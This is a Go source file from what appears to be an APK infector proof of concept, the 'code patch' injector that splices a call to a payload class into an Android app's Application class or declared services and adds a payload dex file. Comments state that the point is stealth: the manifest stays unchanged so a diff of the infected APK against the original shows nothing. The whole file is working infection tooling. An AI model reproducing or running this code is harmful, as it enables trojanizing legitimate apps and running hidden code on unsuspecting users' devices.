package injector

import (
	"encoding/xml"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/dex"
	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/manifest"
)

// The code-patch vectors are the only ones that leave AndroidManifest.xml byte
// for byte what the developer shipped. The payload call is spliced into the
// entry method of a class the app runs anyway: the Application class itself
// (vector 11) or the services the host declares (vector 9). Nothing in the
// component list, the package name or the permission set changes, so a manifest
// diff of the patched APK against the original comes out empty.
const (
	servicePatchClass = "Laaaaaaaaaaaa/ServicePatch;"
	appPatchClass     = "Laaaaaaaaaaaa/AppPatch;"
	codePatchMethod   = "run"
)

// hostManifest is the subset of the plaintext dump the code-patch vectors read.
// The dump is written by the CLI before any patching, so the names here are the
// ones the host shipped with.
type hostManifest struct {
	Package     string          `xml:"package,attr"`
	Application hostApplication `xml:"application"`
	// split APKs carry their manifest in the base APK; the plaintext dump is
	// taken from the APK under patch, which is the base APK in our runs.
}

// hostApplication mirrors <application> together with its <service> children.
// The nesting is spelled out instead of using the "application>service" path tag
// form: Go's XML decoder rejects a path tag whose prefix is already claimed by
// another field of the same struct.
type hostApplication struct {
	Name     string `xml:"name,attr"`
	Services []struct {
		Name string `xml:"name,attr"`
	} `xml:"service"`
}

// qualified turns a manifest component name into a class name: ".Foo" and
// "Foo" are relative to the package, everything else is already fully
// qualified.
func (m hostManifest) qualified(name string) string {
	if name == "" {
		return ""
	}
	if strings.HasPrefix(name, ".") {
		return m.Package + name
	}
	if !strings.Contains(name, ".") {
		return m.Package + "." + name
	}
	return name
}

// descriptor converts a class name into the dex form Lcom/foo/Bar;.
func descriptor(name string) string {
	return "L" + strings.ReplaceAll(name, ".", "/") + ";"
}

// codePatchTargets returns the class descriptors the current vector can patch,
// plus a short note describing what was found in the manifest.
func codePatchTargets(plaintext string) ([]string, string, error) {
	raw, err := os.ReadFile(plaintext)
	if err != nil {
		return nil, "", fmt.Errorf("read the plaintext manifest: %w", err)
	}
	var m hostManifest
	if err := xml.Unmarshal(raw, &m); err != nil {
		return nil, "", fmt.Errorf("parse the plaintext manifest: %w", err)
	}

	if utils.Payload_option == int(utils.CodePatchApp_payload) {
		name := m.qualified(m.Application.Name)
		if name == "" {
			return nil, "the host declares no Application class", nil
		}
		if name == "android.app.Application" {
			// The only class that is instantiated from the manifest is the
			// framework base class: there is nothing of the app's own to patch,
			// and renaming a framework descriptor inside the host dex would
			// break it. Reported as not applicable rather than as a failure.
			return nil, "the host uses android.app.Application itself", nil
		}
		return []string{descriptor(name)}, "Application=" + name, nil
	}

	var out []string
	seen := map[string]bool{}
	for _, s := range m.Application.Services {
		name := m.qualified(s.Name)
		if name == "" || strings.HasPrefix(name, "android.") || seen[name] {
			continue
		}
		seen[name] = true
		out = append(out, descriptor(name))
	}
	note := fmt.Sprintf("declared services=%d", len(m.Application.Services))
	return out, note, nil
}

// planCodePatch rewrites the dex files in place and adds the payload stub. The
// manifest is deliberately absent from the plan: for these vectors the patched
// APK contains the same manifest as the original.
func planCodePatch(inputAPK, outputAPK string) {
	targets, note, err := codePatchTargets(manifestPlainPath())
	if err != nil {
		fmt.Printf("\t--SKIP: %v\n", err)
		os.Remove(outputAPK)
		os.Exit(3)
	}
	if len(targets) == 0 {
		fmt.Printf("\t--SKIP: nothing to patch: %s\n", note)
		os.Remove(outputAPK)
		os.Exit(3)
	}

	payloadClass, stub := servicePatchClass, "payload_service.dex"
	kind := "service"
	if utils.Payload_option == int(utils.CodePatchApp_payload) {
		payloadClass, stub = appPatchClass, "payload_apppatch.dex"
		kind = "Application"
	}
	fmt.Printf("\t--code patch: %d %s class(es) to patch (%s)\n", len(targets), kind, note)

	names, err := ListNames(inputAPK)
	if err != nil {
		fmt.Printf("\t--SKIP: %v\n", err)
		os.Remove(outputAPK)
		os.Exit(3)
	}

	// <clinit> first: it runs when the class is initialised, which for these
	// two vectors is always before the object is used. <init> is the fallback
	// for classes without any static initialiser.
	methodPriority := []string{"<clinit>", "<init>"}

	plan := NewRepackPlan()
	var patchedAll []string
	for _, n := range names {
		if !isDexName(n) {
			continue
		}
		data, err := ReadEntry(inputAPK, n)
		if err != nil {
			fmt.Printf("\t--SKIP: %v\n", err)
			os.Remove(outputAPK)
			os.Exit(3)
		}
		out, patched, err := dex.InsertPayloadCall(data, targets, methodPriority, payloadClass, codePatchMethod)
		if err != nil {
			fmt.Printf("\t--SKIP: %s: %v\n", n, err)
			os.Remove(outputAPK)
			os.Exit(3)
		}
		if len(patched) == 0 {
			continue
		}
		plan.Replace[n] = out
		for _, p := range patched {
			fmt.Printf("\t--code patch: %s in %s\n", p, n)
			log.Printf("code patch: %s in %s", p, n)
			patchedAll = append(patchedAll, p)
		}
	}

	if len(patchedAll) == 0 {
		// The class exists in the manifest but not in any dex on this APK (a
		// split APK keeps classes in a split we were not handed), or the body
		// had no patchable entry method.
		fmt.Printf("\t--SKIP: no patchable %s class body found in %s\n", kind, filepath.Base(inputAPK))
		os.Remove(outputAPK)
		os.Exit(3)
	}

	next := nextDexIndex(names)
	plan.Add = append(plan.Add, Entry{
		Name:   dexName(next),
		Data:   mustReadFile(filepath.Join(filepath.Dir(payloadStubPath()), stub)),
		Method: 8, // zip.Deflate, as the other dex payloads
	})
	log.Printf("code patch: added %s", dexName(next))
	fmt.Printf("\t--code patch: added %s (%s)\n", dexName(next), stub)
	fmt.Printf("CODEPATCH_TARGETS=%s\n", strings.Join(patchedAll, ","))
	fmt.Printf("CODEPATCH_COUNT=%d\n", len(patchedAll))

	writePlan(inputAPK, outputAPK, plan)
}

// manifestPlainPath is where the CLI writes the decoded manifest before any
// patching happens.
func manifestPlainPath() string {
	return manifest.PlainPath
}
